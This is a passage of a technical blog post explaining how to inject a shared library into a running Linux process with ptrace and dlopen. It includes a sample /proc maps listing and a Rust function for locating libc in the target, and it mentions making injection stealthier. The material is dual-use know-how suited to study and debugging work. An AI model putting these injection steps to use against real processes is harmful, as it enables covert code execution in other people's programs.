content/posts/linux-process-injection.md


### Linux {#linux}

When thinking about shared object injection under Linux, the first thing that comes to mind is `LD_PRELOAD`.
`LD_PRELOAD` is an environment variable that specifies a list of shared libraries to be loaded by the linker before any others when starting a program.

Obviously, this approach does not permit the injection of libraries at runtime. Therefore, we need to implement a method similar to the Windows approach described above.
Fortunately, the C standard library `libc`, which is loaded by most programs, offers us the Linux equivalent to `LoadLibrary`, [`dlopen()`](https://man7.org/linux/man-pages/man3/dlopen.3.html), which loads a dynamic library file from disk.
However, Linux lacks convenient API functions for remote process manipulation as Windows provides.
Therefore, we need to figure out another way to mess with the target process. For this we will use [`ptrace`](https://man7.org/linux/man-pages/man2/ptrace.2.html).

`ptrace` is a Linux system call that enables a process to observe and control another process.
Although primarily intended for debugging, we can also use it to read and write to the memory of other processes,
which is all we need since it also allows us to override instructions to build our own remote API.
For an in-depth overview of `ptrace`, refer to Eli Bendersky's [post](https://eli.thegreenplace.net/2011/01/23/how-debuggers-work-part-1) on how debuggers work <a href="#citeproc_bib_item_4">[4]</a>.

> Obviously, the prerequisite for this is that `libc.so` is loaded by the remote process.
> Since this is the case for almost every process, I will consider this a given.
> Similarly, on Windows, the same is implied for `kernel32.dll` (or `ntdll.dll`, which can be used instead).
> If the library is not yet loaded or if you want to inject a bit more stealthily, you can implement the loader yourself.
> For Linux, Amos's great "Making our own executable packer" [series](https://fasterthanli.me/series/making-our-own-executable-packer) might be a good place to start.
> For Windows, I previously created a basic `LoadLibrary` [implementation](https://github.com/d0ntrash/load_library_rs), which I may cover in a future post.


## Implementation {#implementation}

The concept behind this shared object injection is quite similar to the one described for Windows.

-   Locate `libc` inside the targets address space
-   Find the offset of `dlopen()` in the given `libc` version
-   Allocate some memory in the target's address space to hold the library path
-   Write the path into the allocated buffer
-   Finally, make the target process call `dlopen()` to load an run the library

> Some other implementations for shared object injection on Linux use `__libc_dlopen_mode()` instead of `dlopen()`.
> I believe this was necessary because `dlopen()` was included in `libc`, but instead externalized to `libdl`,
> which exported `dlopen()` and called `libc`'s `_libc_dlopen_mode()` internally.
>
> However, `libdl` has been merged into `libc`, which now directly exports `dlopen()`.
> Consequently, `_libc_dlopen_mode()` does not need to be exported anymore, and thus, it has been stripped.
> This seems to be the reason why older implementations did not work for me.


### Locate `libc` {#locate-libc}

Of course, we could use `ptrace` to read the target address space and look for the `libc.so` there.
However, to make it simpler, we will take advantage of the fact that Linux writes information about the memory mappings of each process to `/proc`.
To examine the memory map for a particular process, we can refer to `/proc/<pid>/maps`, where `<pid>` is the process ID of the target process.

For instance, by examining the process map of the command `sleep 100000`, we can obtain all necessary information:

<a id="code-snippet--proc maps"></a>
```text
		 address          perms  offset   dev   inode                        pathname
55beba31b000-55beba31d000 r--p 00000000 fe:02 6033456                    /usr/bin/sleep
55beba31d000-55beba321000 r-xp 00002000 fe:02 6033456                    /usr/bin/sleep
55beba321000-55beba322000 r--p 00006000 fe:02 6033456                    /usr/bin/sleep
55beba323000-55beba324000 r--p 00007000 fe:02 6033456                    /usr/bin/sleep
55beba324000-55beba325000 rw-p 00008000 fe:02 6033456                    /usr/bin/sleep
55bebc02a000-55bebc04b000 rw-p 00000000 00:00 0                          [heap]
7f6322658000-7f63226af000 r--p 00000000 fe:02 6033566                    /usr/lib/locale/C.utf8/LC_CTYPE
7f63226af000-7f63226b2000 rw-p 00000000 00:00 0
7f63226b2000-7f63226da000 r--p 00000000 fe:02 5660105                    /usr/lib/x86_64-linux-gnu/libc.so.6
7f63226da000-7f632286f000 r-xp 00028000 fe:02 5660105                    /usr/lib/x86_64-linux-gnu/libc.so.6
7f632286f000-7f63228c7000 r--p 001bd000 fe:02 5660105                    /usr/lib/x86_64-linux-gnu/libc.so.6
7f63228c7000-7f63228cb000 r--p 00214000 fe:02 5660105                    /usr/lib/x86_64-linux-gnu/libc.so.6
7f63228cb000-7f63228cd000 rw-p 00218000 fe:02 5660105                    /usr/lib/x86_64-linux-gnu/libc.so.6
7f63228cd000-7f63228da000 rw-p 00000000 00:00 0
7f63228db000-7f63228e2000 r--s 00000000 fe:02 5660073                    /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
7f63228e2000-7f63228e4000 rw-p 00000000 00:00 0
7f63228e4000-7f63228e6000 r--p 00000000 fe:02 5660087                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7f63228e6000-7f6322910000 r-xp 00002000 fe:02 5660087                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7f6322910000-7f632291b000 r--p 0002c000 fe:02 5660087                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7f632291c000-7f632291e000 r--p 00037000 fe:02 5660087                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7f632291e000-7f6322920000 rw-p 00039000 fe:02 5660087                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7fffbe9dc000-7fffbe9fd000 rw-p 00000000 00:00 0                          [stack]
7fffbea37000-7fffbea3b000 r--p 00000000 00:00 0                          [vvar]
7fffbea3b000-7fffbea3d000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]
```

Even a simple program like `sleep` loads `libc`  and a few additional libraries.

In our particular case, we are only interested in entries that contain `libc` in their path names.
In fact, we only need the path name and start address of the first entry, since that will be our entry point into the targets `libc`.

```rust
/// Get MapRange for `so_name` in target process
fn get_so_map(pid: Pid, so_name: &str) -> Option<MapRange> {
    // Get Process map
    let maps = get_process_maps(pid.into()).expect("Failed to get the process map of: {pid}");
    for map in maps {
	if let Some(filename) = map.filename() {
	    if Path::new(filename).file_name()
		.and_then(|name| name.to_str())
		.map(|name| name.contains(so_name))
		.unwrap_or(false)
	    {
		return Some(map);
	    }
	}
    }
    None
}
```

I am using the [proc_maps](https://docs.rs/proc-maps/latest/proc_maps/) crate to fetch and parse the maps of a particular process.
This enables me to iterate over all the maps to return the first one that matches the path name we are looking for.
